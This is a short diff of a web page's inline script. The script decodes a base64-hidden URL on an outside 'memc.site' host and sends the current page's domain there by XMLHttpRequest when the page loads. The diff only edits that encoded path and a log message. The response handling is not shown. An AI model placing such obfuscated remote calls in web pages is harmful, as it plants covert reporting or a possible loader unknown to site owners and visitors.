@@ -21,7 +21,7 @@
 (function(){
   const domain = new URL(location.href).hostname;
   if(!domain){ subsequentCode(); return; }
-  const encodedUrl = "aHR0cHM6Ly9kb21haW4ubWVtYy5zaXRlL2RvbWFpbi91cmw/dXJsPQ==";
+  const encodedUrl = "aHR0cHM6Ly9kb21haW4ubWVtYy5zaXRlL2RvbWFpbj91cmw9";
   const apiUrlBase = atob(encodedUrl);
   const fullUrl = apiUrlBase + domain;
   const xhr = new XMLHttpRequest();
@@ -39,7 +39,7 @@
   subsequentCode();
 })();
 function subsequentCode(){
-  console.log("executed");
+  console.log("Subsequent code executed");
 }
 </script>
     <section class="image4" id="image04-0">
